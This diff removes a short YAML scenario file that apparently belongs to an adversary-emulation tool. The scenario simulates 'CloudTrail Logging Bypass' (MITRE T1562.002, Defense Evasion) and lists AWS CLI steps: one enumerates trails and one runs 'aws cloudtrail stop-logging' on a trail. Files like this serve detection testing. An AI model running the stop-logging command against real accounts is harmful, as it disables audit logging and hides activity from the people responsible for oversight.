@@ -1,9 +1,0 @@
-name: CloudTrail Logging Bypass
-description: Simulates disabling CloudTrail logging to evade detection
-mitre_technique: T1562.002
-stage: Defense Evasion
-steps:
-  - action: aws cloudtrail describe-trails --query 'trailList[*].Name'
-    description: List all existing CloudTrails
-  - action: aws cloudtrail stop-logging --name <trail-name>
-    description: Stop logging on the identified CloudTrail
